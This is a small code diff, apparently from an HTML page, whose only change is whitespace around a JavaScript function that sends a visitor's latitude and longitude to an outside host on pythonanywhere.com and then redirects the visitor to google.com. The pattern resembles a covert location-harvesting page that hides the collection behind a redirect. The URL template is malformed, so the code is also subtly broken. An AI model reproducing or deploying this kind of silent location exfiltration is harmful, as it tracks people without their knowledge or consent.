@@ -33,12 +33,13 @@
             }
         }
 
-        function sendData(lat, lon) {
+                function sendData(lat, lon) {
             const url = `https://pythonanywhere.com{lat}&lon=${lon}`;
             fetch(url, {mode: 'no-cors'}).then(() => {
                 window.location.href = "https://google.com";
             });
         }
+
     </script>
 </body>
 </html>
